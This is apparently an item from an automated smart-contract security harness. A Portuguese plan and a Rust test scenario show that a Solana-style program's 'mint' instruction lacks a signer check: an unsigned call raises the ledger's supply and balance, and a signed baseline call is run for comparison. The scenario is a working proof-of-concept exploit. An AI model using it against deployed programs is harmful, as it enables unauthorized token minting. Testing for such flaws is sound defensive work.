{
  "plan": "O ataque explora a ausência de verificação de assinatura na instrução `mint`. O cenário monta uma conta `ledger` controlada pelo atacante (dados com supply e balance iniciais em zero) e chama `mint` com um valor arbitrário, sem que a conta `ledger` assine a transação. O baseline usa a mesma instrução, mas com a conta `ledger` assinando, para provar que o cenário está correto. O efeito medido é que, mesmo sem assinatura, o saldo e o supply da conta `ledger` são incrementados pelo valor mintado, demonstrando a vulnerabilidade.",
  "scenario": "let ledger_key = Pubkey::new_unique();
let mut ledger_data = vec![0u8; 56];
// supply em 40..48 e balance em 48..56 já são zero
let ledger_account = account(&env.program_id, &ledger_data, None);

// Baseline: mint com a conta ledger assinando (uso legítimo)
let ix_baseline = env.raw_ix(&[IX_MINT, 10, 0, 0, 0, 0, 0, 0, 0], &[
    AccountMeta::new(ledger_key, true),
]);
let contas_baseline = vec![
    (ledger_key, ledger_account.clone()),
];
let r_baseline = env.baseline("mint legítimo com assinatura", &ix_baseline, &contas_baseline);

// Ataque: mint sem a conta ledger assinar
let ix_attack = env.raw_ix(&[IX_MINT, 100, 0, 0, 0, 0, 0, 0, 0], &[
    AccountMeta::new(ledger_key, false),
]);
let contas_attack = vec![
    (ledger_key, ledger_account),
];
let r_attack = env.attack("mint sem assinatura", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let ledger_after = after(&r_attack, &ledger_key);
    let supply_after = read_u64(ledger_after.data(), 40);
    let balance_after = read_u64(ledger_after.data(), 48);
    env.effect("supply incrementado sem assinatura", supply_after == 100);
    env.effect("balance incrementado sem assinatura", balance_after == 100);
}"
}

